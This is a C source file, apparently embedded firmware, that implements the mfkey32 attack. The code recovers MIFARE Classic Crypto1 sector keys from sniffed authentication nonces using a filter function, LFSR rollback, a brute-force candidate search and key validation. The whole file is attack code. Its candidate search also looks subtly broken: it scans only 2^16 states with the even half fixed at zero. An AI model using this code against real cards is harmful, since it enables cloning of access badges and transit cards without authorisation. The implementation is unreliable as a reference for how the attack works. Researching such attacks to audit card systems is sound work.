#include "mf_classic_mfkey32.h"
#include <nfc.h>
#include "esp_timer.h"
#include <errno.h>
#include <string.h>

#define LF_POLY_ODD  (0x29CE5C)
#define LF_POLY_EVEN (0x870804)

#undef BIT
#define BIT(x, n)   (((x) >> (n)) & 1)
#define BEBIT(x, n) BIT(x, (n) ^ 24)

static inline uint32_t even_parity32(uint32_t x) { return __builtin_parity(x); }
static inline int64_t  uptime_ms(void)           { return esp_timer_get_time() / 1000; }

static uint32_t filter(uint32_t in)
{
    uint32_t out = 0;
    out  = 0xf22c0 >> (in        & 0xf) & 16;
    out |= 0x6c9c0 >> (in >>  4  & 0xf) & 8;
    out |= 0x3c8b0 >> (in >>  8  & 0xf) & 4;
    out |= 0x1e458 >> (in >> 12  & 0xf) & 2;
    out |= 0x0d938 >> (in >> 16  & 0xf) & 1;
    return BIT(0xEC57E80A, out);
}

struct bucket_entry { uint32_t odd; uint32_t even; };

#define MAX_CANDIDATES 512
static struct bucket_entry candidates[MAX_CANDIDATES];

static inline void lfsr_rollback_bit(uint32_t *odd, uint32_t *even, uint8_t in, int fb)
{
    uint32_t t, out;
    *odd &= 0xffffff;
    t = *odd; *odd = *even; *even = t;
    out = *even & 1;
    out ^= LF_POLY_EVEN & (*even >>= 1);
    out ^= LF_POLY_ODD & *odd;
    out ^= !!in;
    if(fb) out ^= filter(*odd);
    *even |= even_parity32(out) << 23;
}

static void lfsr_rollback_word(uint32_t *odd, uint32_t *even, uint32_t in, int fb)
{
    for(int i = 31; i >= 0; i--) lfsr_rollback_bit(odd, even, BEBIT(in, i), fb);
}

static uint64_t lfsr_recover_state(uint32_t odd, uint32_t even)
{
    uint64_t key = 0;
    for(int i = 23; i >= 0; i--) {
        key = (key << 1) | BIT(odd, i);
        key = (key << 1) | BIT(even, i);
    }
    uint64_t out = 0;
    for(int i = 0; i < 48; i++) out |= BIT(key, i ^ 7) << (uint64_t)i;
    return out;
}

static bool validate_key(uint64_t key, uint32_t uid,
                         uint32_t nt, uint32_t nr, uint32_t ar)
{
    struct crypto1_state s;
    crypto1_init(&s, key);
    crypto1_word(&s, nt ^ uid, 0);
    crypto1_word(&s, nr, 1);
    uint32_t ar_check = ar ^ crypto1_word(&s, 0, 0);
    return ar_check == crypto1_prng_successor(nt, 64);
}

int mfkey32_solve(const struct mfkey32_nonce_pair *pair,
                  struct mfkey32_result *result)
{
    int64_t t_start = uptime_ms();
    memset(result, 0, sizeof(*result));

    uint32_t uid = pair->uid;
    uint32_t nt0 = pair->nt0;
    uint32_t nr0 = pair->nr0;
    uint32_t ar0 = pair->ar0;
    uint32_t nt1 = pair->nt1;

    uint32_t p64_0 = crypto1_prng_successor(nt0, 64);
    uint32_t ks0_ar = ar0 ^ p64_0;

    int found = 0;
    int ncandidates = 0;

    for(uint32_t i = 0; i < (1U << 16) && !found; i++) {
        uint32_t odd  = (i << 8) | (ks0_ar >> 24);
        uint32_t even = 0;
        uint32_t test_odd = odd;
        uint32_t test_even = even;

        bool match = true;
        for(int bit = 31; bit >= 0; bit--) {
            uint8_t ks_bit = BIT(ks0_ar, bit ^ 24);
            if(filter(test_odd) != ks_bit) { match = false; break; }

            uint32_t feed = ks_bit;
            feed ^= BIT(nr0, bit ^ 24);
            feed ^= LF_POLY_ODD & test_odd;
            feed ^= LF_POLY_EVEN & test_even;
            test_even = test_even << 1 | even_parity32(feed);

            uint32_t tmp = test_odd; test_odd = test_even; test_even = tmp;
        }
        if(!match) continue;

        if(ncandidates < MAX_CANDIDATES) {
            candidates[ncandidates].odd  = test_odd;
            candidates[ncandidates].even = test_even;
            ncandidates++;
        }
    }

    for(int c = 0; c < ncandidates && !found; c++) {
        uint32_t odd  = candidates[c].odd;
        uint32_t even = candidates[c].even;

        lfsr_rollback_word(&odd, &even, nr0, 1);
        lfsr_rollback_word(&odd, &even, uid ^ nt0, 0);

        uint64_t key = lfsr_recover_state(odd, even);

        if(validate_key(key, uid, nt0, nr0, ar0) &&
           validate_key(key, uid, nt1, pair->nr1, pair->ar1)) {
            result->found = true;
            uint64_to_key(key, result->key);
            found = 1;
        }
    }

    result->elapsed_ms = (uint32_t)(uptime_ms() - t_start);
    return found ? 0 : -ENOENT;
}

int mfkey32_solve_batch(const struct mfkey32_nonce_pair *pairs, size_t count,
                        struct mfkey32_result *results, size_t max_results)
{
    int found = 0;
    size_t n = (count < max_results) ? count : max_results;
    for(size_t i = 0; i < n; i++) {
        if(mfkey32_solve(&pairs[i], &results[i]) == 0) found++;
    }
    return found;
}
